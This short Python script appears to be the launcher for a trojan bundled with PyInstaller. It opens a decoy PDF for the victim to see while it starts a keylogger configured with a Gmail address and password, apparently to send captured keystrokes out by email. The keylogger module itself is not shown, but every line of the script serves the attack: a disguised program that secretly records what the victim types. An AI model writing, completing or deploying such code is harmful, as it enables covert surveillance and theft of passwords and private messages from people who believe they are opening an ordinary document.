import keylogger
import subprocess
import sys

file_name = sys._MEIPASS + "/sample.pdf"
subprocess.Popen(file_name, shell=True)

my_keylogger = keylogger.Keylogger(20, "example@gmail.com", "12345678")
my_keylogger.start()